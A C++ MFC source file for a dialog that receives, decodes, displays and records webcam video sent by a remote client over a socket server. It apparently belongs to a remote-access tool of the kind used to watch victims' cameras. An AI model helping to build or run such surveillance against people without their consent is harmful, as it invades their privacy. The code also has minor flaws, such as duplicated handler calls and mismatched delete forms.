// VideoDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "HP_Star.h"
#include "VideoDlg.h"
#include "afxdialogex.h"


// CVideoDlg 对话框

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)


	enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// 视频压缩
	IDM_SAVEDIB,					// 保存快照
	IDM_SAVEAVI,					// 保存录像
	IDM_SIZE_176_144,				// 视频分辨率, H263只支持这两种
	IDM_SIZE_352_288
};
CVideoDlg::CVideoDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CVideoDlg::IDD, pParent)
{
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
//	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_CAMERA));
	m_nCount		= 0;
	m_lpbmi			= NULL;
	m_lpScreenDIB	= NULL;
	m_lpCompressDIB	= NULL;
	//m_pVideoCodec	= NULL;
	m_fccHandler=1129730893;     //Microsoft Video 1
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	m_nOldWidth = 0;
	m_nCount = 0;
	m_pVideoCodec=new CVideoCodec;
	ResetScreen();
}

CVideoDlg::~CVideoDlg()
{
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_GETMINMAXINFO()
	ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()


// CVideoDlg 消息处理程序


void CVideoDlg::ResetScreen(void)
{
	if (m_lpbmi)
	{
		delete m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}
	if (m_lpCompressDIB)
	{
		delete m_lpCompressDIB;
		m_lpCompressDIB = NULL;
	}

	/*if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}*/

	int	nBmiSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);

	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	m_pVideoCodec->InitCompressor(m_lpbmi, m_fccHandler);
	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	//if (IsWindowVisible())
		//InitMMI();
}


void CVideoDlg::InitMMI(void)
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// 边框的宽度
	int	nBorderWidth = rectClient.left - rectWindow.left;

	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;

	// 调整窗口到远程大小
	MoveWindow(&rectWindow);

	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;

	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}


void CVideoDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_lpScreenDIB==NULL)
	{
		CDialog::OnClose();
	}
	if (!m_aviFile.IsEmpty())
		SaveAvi();


	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	if (m_lpbmi!=NULL){ 
		delete [] m_lpbmi;
		m_lpbmi=NULL;
	}
	if (m_lpScreenDIB)
	{
		delete [] m_lpScreenDIB;
		m_lpScreenDIB=NULL;
	}
	if (m_lpCompressDIB){
		delete [] m_lpCompressDIB;
		m_lpCompressDIB=NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;
	}
	
	CDialog::OnClose();
}


void CVideoDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO: 在此处添加消息处理程序代码
	// 不为绘图消息调用 CDialog::OnPaint()
	if (m_lpScreenDIB==NULL)
	{
		return;
	}
	RECT rect;
	GetClientRect(&rect);

	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_lpbmi,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);

	LPCTSTR	lpTipsString = "Recording ...";
	// 写入录像文件
	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(m_lpScreenDIB);
		// 提示正在录像
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
}


void CVideoDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lpMMI, &m_MMI, sizeof(MINMAXINFO));

	return ;
	CDialog::OnGetMinMaxInfo(lpMMI);
}


void CVideoDlg::OnReceiveComplete(void)
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		DrawDIB();                  //这里是绘图函数，转到他的代码看一下
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 视频大小调整成功
		ResetScreen();
		break;
	default:
		// 传输发生异常数据
		//SendException();
		break;
	}
}


void CVideoDlg::DrawDIB(void)
{
	 CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu == NULL)
		return;
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	if (lpBuffer[1] == 0) // 没有经过H263压缩的原始数据，不需要解码
	{
		// 第一次，没有压缩，说明服务端不支持指定的解码器
		if (m_nCount == 1)
		{
			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
	}
	else // 解码
	{
		////这里缓冲区里的的第二个字符正好是是否视频解码 
		InitCodec(*(LPDWORD)(lpBuffer + 2));     
		if (m_pVideoCodec != NULL)
		{
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
			//这里开始解码，解码后就是同未压缩的一样了 显示到对话框上。 接下来开始视频保存成avi格式
			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
		}
	}
	//OnPaint();
	PostMessage(WM_PAINT);

}


BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "视频压缩(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "保存录像(&V)");
		pSysMenu->AppendMenu(MF_SEPARATOR);	
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_176_144, "176 * 144");
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_352_288, "352 * 288");

		// 不支持固定的大小，说明远程视频有固定的大小，调整命令失效 
		if ((m_lpbmi->bmiHeader.biWidth != 352 && m_lpbmi->bmiHeader.biWidth != 288)
			&& (m_lpbmi->bmiHeader.biWidth != 176 && m_lpbmi->bmiHeader.biWidth != 144))
		{
			pSysMenu->EnableMenuItem(IDM_SIZE_176_144, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
			pSysMenu->EnableMenuItem(IDM_SIZE_352_288, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		else
			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);

	}

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	// 初始化窗口大小结构
	InitMMI();

	m_hDD = DrawDibOpen();
	m_hDC = ::GetDC(m_hWnd);

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CVideoDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	//同样的m_pVideoCodec 是CVideoCodec类的对象
	//回到DrawDIB
	if (!m_pVideoCodec->InitCompressor(m_lpbmi, fccHandler))
	{
		delete m_pVideoCodec;
		// 置NULL, 发送时判断是否为NULL来判断是否压缩
		m_pVideoCodec = NULL;
		// 通知服务端不启用压缩
		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}	
}


void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_ENABLECOMPRESS:
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			bIsChecked = !bIsChecked;
			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
			if (!bIsChecked)
				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		}
		break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
	case IDM_SIZE_176_144:
		{
			//if (SendResetScreen(176, 144))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_176_144, MF_BYCOMMAND);
		}
		break;
	case IDM_SIZE_352_288:
		{
			//if (SendResetScreen(352, 288))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);
		}
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
	CDialog::OnSysCommand(nID, lParam);
}


void CVideoDlg::SaveAvi(void)
{
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "视频文件(*.avi)|*.avi|", this);
	if(dlg.DoModal () != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
		if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = "";
		MessageBox("创建录像文件失败");	
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}
}